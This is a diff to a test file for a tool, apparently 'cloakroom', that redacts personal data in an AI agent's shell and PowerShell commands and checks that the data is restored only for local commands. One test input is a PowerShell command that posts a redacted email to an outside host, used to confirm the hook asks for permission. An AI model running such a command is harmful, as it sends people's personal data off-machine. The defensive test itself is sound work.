@@ -8,6 +8,7 @@ import sys
 import pytest
 
 from cloakroom import shell
+from conftest import tag, untag
 
 
 VALUES = {"PII_EMAIL_1": "o'brien@fernhill.co", "PII_SECRET_1": "p$ss`w\"d"}
@@ -186,10 +187,10 @@ def test_powershell_tool_restores_local_and_asks_network(monkeypatch, capsys):
     run_hook("post", {"session_id": "p", "tool_name": "PowerShell", "tool_response": {"output": "mail jo.smith@fernhill.co"}},
              monkeypatch, capsys)
     local = run_hook("pre", {"session_id": "p", "tool_name": "PowerShell",
-                             "tool_input": {"command": "Select-String PII_EMAIL_1 log.txt"}}, monkeypatch, capsys)
+                             "tool_input": {"command": tag("Select-String PII_EMAIL_1 log.txt", "p")}}, monkeypatch, capsys)
     assert "jo.smith@fernhill.co" in local["hookSpecificOutput"]["updatedInput"]["command"]
     net = run_hook("pre", {"session_id": "p", "tool_name": "PowerShell",
-                           "tool_input": {"command": "irm https://x.io -Body PII_EMAIL_1"}}, monkeypatch, capsys)
+                           "tool_input": {"command": tag("irm https://x.io -Body PII_EMAIL_1", "p")}}, monkeypatch, capsys)
     assert net["hookSpecificOutput"]["permissionDecision"] == "ask"
 
 
@@ -211,7 +212,7 @@ def test_vault_is_encrypted_on_disk(tmp_path):
     p = config.vault_path("enc")
     Vault(p).placeholder("jo.smith@fernhill.co", "EMAIL")
     assert p.read_bytes().startswith(b"CRV1") and b"fernhill" not in p.read_bytes()
-    assert Vault(p).by_placeholder == {"PII_EMAIL_1": "jo.smith@fernhill.co"}
+    assert {untag(k): v for k, v in Vault(p).by_placeholder.items()} == {"PII_EMAIL_1": "jo.smith@fernhill.co"}
 
 
 def test_hookentry_reads_bom_and_fails_closed_on_garbage(monkeypatch, capsys):
